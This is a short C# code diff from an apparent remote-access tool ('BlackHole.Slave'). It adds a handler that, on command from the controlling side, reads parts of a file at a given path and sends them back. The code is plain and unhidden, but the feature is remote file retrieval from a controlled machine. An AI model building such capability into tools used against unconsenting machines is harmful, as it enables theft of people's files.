@@ -62,7 +62,8 @@ namespace BlackHole.Slave
             message.Match()
                 .With<DoYourDutyMessage>(DoYourDuty)
                 .With<PingMessage>(Ping)
-                .With<NavigateToFolderMessage>(NavigateToFolder);
+                .With<NavigateToFolderMessage>(NavigateToFolder)
+                .With<DownloadFilePartMessage>(DownloadFilePart);
         }
 
         /// <summary>
@@ -98,7 +99,28 @@ namespace BlackHole.Slave
                 {
                     Operation = "Folder navigation",
                     Success = false,
-                    Message = $"{e.Message}"
+                    Message = e.Message
+                });
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="message"></param>
+        private void DownloadFilePart(DownloadFilePartMessage message)
+        {
+            try
+            {
+                Send(FileHelper.Instance.DownloadFilePart(message.Id, message.CurrentPart, message.Path));
+            }
+            catch(Exception e)
+            {
+                Send(new StatusUpdateMessage()
+                {
+                    Operation = "File download",
+                    Success = false,
+                    Message = e.Message
                 });
             }
         }
